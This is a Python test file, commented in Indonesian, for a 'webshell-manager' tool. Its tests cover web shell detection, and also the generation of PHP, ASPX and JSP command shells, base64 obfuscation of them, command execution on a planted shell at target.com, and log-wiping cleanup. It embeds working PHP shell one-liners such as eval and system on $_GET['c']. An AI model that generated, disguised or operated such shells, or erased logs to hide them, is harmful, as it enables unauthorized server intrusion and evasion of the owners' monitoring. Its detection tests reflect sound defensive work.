#!/usr/bin/env python3
"""E2E tests untuk webshell-manager."""
import subprocess, sys, os, tempfile

KIT_DIR = os.path.dirname(os.path.abspath(__file__))
SCRIPT = os.path.join(KIT_DIR, "webshell_manager.py")

def run(*args):
    r = subprocess.run([sys.executable, SCRIPT, *args], capture_output=True, text=True)
    return r.returncode, r.stdout, r.stderr

def test_detect():
    with tempfile.NamedTemporaryFile(mode='w', suffix='.php', delete=False) as f:
        f.write("<?php eval($_GET['c']); ?>")
        path = f.name
    rc, out, _ = run("detect", "--path", path)
    assert rc == 0
    assert "eval" in out
    os.unlink(path)
    print("[PASS] detect")

def test_detect_clean():
    with tempfile.NamedTemporaryFile(mode='w', suffix='.php', delete=False) as f:
        f.write("<?php echo 'Hello World'; ?>")
        path = f.name
    rc, out, _ = run("detect", "--path", path)
    assert rc == 0
    assert "Tidak ada" in out or "0" in out
    os.unlink(path)
    print("[PASS] detect clean")

def test_obfuscate_base64():
    with tempfile.NamedTemporaryFile(mode='w', suffix='.php', delete=False) as f:
        f.write("<?php system($_GET['c']); ?>")
        path = f.name
    rc, out, _ = run("obfuscate", "--file", path, "--method", "base64")
    assert rc == 0
    assert "base64" in out.lower()
    os.unlink(path)
    print("[PASS] obfuscate base64")

def test_generate_php():
    rc, out, _ = run("generate", "--type", "php", "--method", "command")
    assert rc == 0
    assert "system" in out
    print("[PASS] generate php")

def test_generate_aspx():
    rc, out, _ = run("generate", "--type", "aspx", "--method", "command")
    assert rc == 0
    assert "Process" in out
    print("[PASS] generate aspx")

def test_generate_jsp():
    rc, out, _ = run("generate", "--type", "jsp", "--method", "command")
    assert rc == 0
    assert "Runtime" in out
    print("[PASS] generate jsp")

def test_manage():
    rc, out, _ = run("manage", "--url", "https://target.com/shell.php", "--pass", "password")
    assert rc == 0
    assert "whoami" in out
    assert "ls" in out
    print("[PASS] manage")

def test_clean():
    rc, out, _ = run("clean", "--url", "https://target.com/shell.php", "--pass", "password")
    assert rc == 0
    assert "rm" in out
    assert "logs" in out.lower() or "log" in out.lower()
    print("[PASS] clean")

if __name__ == "__main__":
    test_detect()
    test_detect_clean()
    test_obfuscate_base64()
    test_generate_php()
    test_generate_aspx()
    test_generate_jsp()
    test_manage()
    test_clean()
    print("\n=== SEMUA TEST LULUS (8/8) ===")
